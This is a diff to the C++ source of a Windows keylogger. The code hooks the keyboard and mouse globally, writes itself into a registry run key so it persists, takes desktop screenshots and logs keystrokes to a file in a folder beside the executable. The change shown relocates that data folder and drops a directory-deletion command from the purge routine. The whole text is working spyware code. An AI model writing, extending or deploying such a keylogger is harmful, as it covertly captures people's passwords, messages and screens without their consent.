@@ -4,7 +4,7 @@ using namespace std;
 
 KeyLogger* KeyLogger::instance = NULL;
 
-void KeyLogger::persist(std::string programName) {
+void KeyLogger::persist() {
 	
 	HKEY key;
 
@@ -16,12 +16,11 @@ void KeyLogger::persist(std::string programName) {
 
 	std::string keyValue = "\"";
 
-	keyValue += programName;
+	keyValue += programPath;
 
 	keyValue += "\"";
 
 	RegSetValueEx(key, REGKEY_NAME, 0, REG_SZ, (BYTE*)keyValue.c_str(), keyValue.length());
-
 }
 
 void KeyLogger::purge() {
@@ -33,8 +32,6 @@ void KeyLogger::purge() {
 		&key
 		);
 	RegDeleteValue(key, REGKEY_NAME);
-
-	system("rmdir /S /Q gathered");
 }
 
 KeyLogger::KeyLogger() {
@@ -46,9 +43,18 @@ KeyLogger::KeyLogger() {
     altDown = false;
     ctrlDown = false;
 
-	_wmkdir(L"gathered");
+	char buffer[1024];
+	GetModuleFileName(NULL, buffer, sizeof(buffer));
+	
+	programPath = buffer;
+	programDir = programPath;
+	
+	while (programDir[programDir.length() - 1] != '\\') {
+		programDir.erase(programDir.length() - 1);
+	}
 
-	logFilePath = "gathered\\keystrokes.txt";
+	CreateDirectory(std::string(programDir + DATADIR).c_str(), NULL);
+	
 	activeWindowTitle = getActiveWindowTitle();
 }
 
@@ -173,11 +179,11 @@ LRESULT KeyLogger::hookFunction(int nCode, WPARAM wParam, LPARAM lParam) {
 
 void KeyLogger::screenshot() {
 	std::stringstream fileName;
-	fileName << "gathered\\" << time(NULL) << ".bmp";
+	fileName << programDir << DATADIR << "\\" <<  time(NULL) << ".bmp";
 	takeScreenshot(GetDesktopWindow(), fileName.str());
 
 	log("<SCREENSHOT " + fileName.str() + ">\n");
-}
+}	
 
 void KeyLogger::listen() {
 
@@ -190,11 +196,11 @@ void KeyLogger::listen() {
 	khook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookFunction, instance, 0);
 	mhook = SetWindowsHookEx(WH_MOUSE_LL, (HOOKPROC)hookFunction, instance, 0);
 
-	logFile.open(logFilePath.c_str(), ios::app);
+	logFile.open(programDir + DATADIR + "\\keystrokes.txt", ios::app);
 
     MSG message;
     while (GetMessage(&message, NULL, 0, 0)) {
-        TranslateMessage(&message);
+        TranslateMessage(&message);	
         DispatchMessage(&message);
     }
 }
